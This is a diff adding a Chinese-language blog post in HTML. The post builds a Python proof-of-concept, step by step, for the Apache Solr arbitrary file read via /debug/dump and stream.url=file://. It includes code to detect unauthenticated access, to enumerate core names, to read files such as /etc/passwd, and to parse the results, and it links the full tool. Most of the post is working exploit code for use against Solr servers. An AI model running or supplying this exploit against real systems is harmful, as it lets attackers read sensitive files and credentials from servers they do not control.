@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Apache-Solr 任意文件读取（20210318爆出） 漏洞触发点 漏洞是通过实例下的：/debug/dump?param=ContentStreams，参数：">
+
+<meta itemprop="wordCount" content="1070">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="" />
+<meta property="og:description" content="Apache-Solr 任意文件读取（20210318爆出） 漏洞触发点 漏洞是通过实例下的：/debug/dump?param=ContentStreams，参数：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.a1ee.cn/simaple/apache-solr-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%9620210318%E7%88%86%E5%87%BA/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Apache-Solr 任意文件读取（20210318爆出） 漏洞触发点 漏洞是通过实例下的：/debug/dump?param=ContentStreams，参数："/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title></title>
+	<link rel="stylesheet" href="https://www.a1ee.cn/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://www.a1ee.cn">alee</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://www.a1ee.cn/basic/">BASIC</a>
+				<a href="https://www.a1ee.cn/simaple/">SIMAPLE</a>
+				<a href="https://www.a1ee.cn/medium/">MEDIUM</a>
+				<a href="https://www.a1ee.cn/about-me/">ABOUT</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/a1eex0" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://www.a1ee.cn/basic/">BASIC</a></li>
+			<li><a href="https://www.a1ee.cn/simaple/">SIMAPLE</a></li>
+			<li><a href="https://www.a1ee.cn/medium/">MEDIUM</a></li>
+			<li><a href="https://www.a1ee.cn/about-me/">ABOUT</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jan 1, 0001</span></div>
+				<h1></h1>
+			</header>
+			<div class="content">
+				<h1 id="apache-solr-任意文件读取20210318爆出">Apache-Solr 任意文件读取（20210318爆出）<a href="#apache-solr-任意文件读取20210318爆出" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<h2 id="漏洞触发点">漏洞触发点<a href="#漏洞触发点" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>漏洞是通过实例下的：<code>/debug/dump?param=ContentStreams</code>，参数：<code>stream.url</code>触发的。</p>
+<p>想要触发该漏洞，需要两个必要条件：</p>
+<pre><code>Solr满足未授权访问
+能从`cores`文件中找到实例名称
+</code></pre><p>结合必要条件，我们来梳理一下POC实现起来需要的步骤：</p>
+<p>第一步：根据漏洞利用方式，结合实际应用场景，我们需要准备三个参数：<code>ip地址</code>、<code>端口信息</code>、<code>读取目录</code>；</p>
+<p>第二步：漏洞是建立在未授权访问的基础之上的，所以需要做是否存在未授权的判断；</p>
+<p>第三步：获取实例名称；</p>
+<p>第四步：触发漏洞请求；</p>
+<p>第五步：处理响应信息。</p>
+<p>根据上述的步骤，我们开始构建POC</p>
+<h2 id="构建poc">构建POC<a href="#构建poc" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="第一步">第一步<a href="#第一步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>判断输入参数是否合适。</p>
+<pre><code>def PfError():
+	print('usage: solr_readfile.py ip port path')
+	print('e.g  : solr_readfile.py 127.0.0.1 8983 /etc/passwd')
+	exit()
+
+if __name__ == '__main__':
+	if len(sys.argv) != 4:
+		PfError()
+</code></pre><h3 id="第二步">第二步<a href="#第二步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>在Solr中，可通过访问<code>/solr/admin/cores?indexInfo=false&amp;wt=json</code>路径，获取一个包含了实例名称的json文件，但是如果不存在未授权访问，访问该url则会提示<code>401</code>，我们可以利用这一点来进行第二步的判断。</p>
+<pre><code>def CheckUnauthorized(ip,port):
+	url = 'http://' + ip + ':' + port + '/solr/admin/cores?indexInfo=false&amp;wt=json'
+	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}
+	response = requests.get(url, headers=headers)
+	if response.status_code !=200:
+		print('Not have this vulnerability...')
+		exit()
+</code></pre><h3 id="第三步">第三步<a href="#第三步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>由于第二步的请求可复用，所以我们将函数修改一下，当存在未授权访问，就直接将响应的<code>json</code>文件加载为字典，从<code>status</code>中的读取<code>key</code>，就是实例名称了，由于可能会存在多个实例，所以这里使用了循环来统计输出。</p>
+<pre><code>def GetInstancelist(ip,port):
+	url = 'http://' + ip + ':' + port + '/solr/admin/cores?indexInfo=false&amp;wt=json'
+	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}
+	response = requests.get(url, headers=headers)
+	if response.status_code !=200:
+		print('Not have this vulnerability...')
+		exit()
+	instancelist = []
+	for i in json.loads(response.text)['status'].keys():
+		instancelist.append(i)
+	return instancelist
+</code></pre><h3 id="第四步">第四步<a href="#第四步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>由以上三步，我们已经获取了漏洞触发的所有必要参数。首先是漏洞请求链接：<code>http://+ip:port+/solr/+instancedir+/debug/dump?param=ContentStreams</code>，POST请求内容是：<code>stream.url=file://+filepath</code>。</p>
+<pre><code>def ReadFile(instancelist,filepath):
+	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
+	'Content-Type': 'application/x-www-form-urlencoded'}
+	data = 'stream.url=file://'+ filepath
+	for instancedir in instancelist:
+		url = 'http://' + ip + ':' + port + '/solr/' + instancedir + '/debug/dump?param=ContentStreams'
+		response = requests.post(url,headers=headers,data=data)
+		if response.status_code != 200:
+			print('\n[-] This url not have vulnerability: ' + url)
+			continue
+		print('\n[+] This url have vulnerability: ' + url)
+</code></pre><h3 id="第五步">第五步<a href="#第五步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>因为版本不同，存在不一样的响应格式，目前发现的响应格式存在两种<code>json</code>、<code>xml</code></p>
+<pre><code>def PfFile(r,path):
+	flag = r.headers['Content-Type']
+	# 响应类型为json格式，采用此处提取响应内容
+	if 'json' in flag:
+		try:
+			result = json.loads(r.text)['streams'][0]['stream']
+		except e:
+			print('[+] Something is error…… Please contact author increase!')
+		print('\n[+] Lucky! filepath:'+path+'\n')
+		print(result)
+	# 响应类型为xml格式，采用此处提取响应内容
+	elif 'xml' in flag:
+		DomTree = xml.dom.minidom.parseString(r.text)
+		try:
+			result = DomTree.documentElement.getElementsByTagName('str')[8].firstChild.data
+		except e:
+			print('[+] Something is error…… Please contact author increase!')
+		print('\n[+] Lucky! filepath:'+path+'\n')
+		print(result)
+	# 其他的响应格式由此处输出，如果存在的话。
+	else:
+		print('[+] Find a new type! Please contact author increase!\n'+r.text)
+	print('[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]')
+</code></pre><h2 id="成功截图">成功截图<a href="#成功截图" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><img src="Apache-Solr_images/4363814090360.png" alt=""></p>
+<p><code>solr_readfile.py</code>的<a href="https://github.com/a1eex0/Utilities/tree/main/Solr/solr%20Arbitrary%20file%20reading">github地址</a></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>0001-01-01 08:00 &#43;0800</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://www.a1ee.cn/simaple/sbulime_text3/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>Sbulime_text3</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://www.a1ee.cn">alee</a></p>
+	</footer>
+
+
+
+	<script src="https://www.a1ee.cn/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
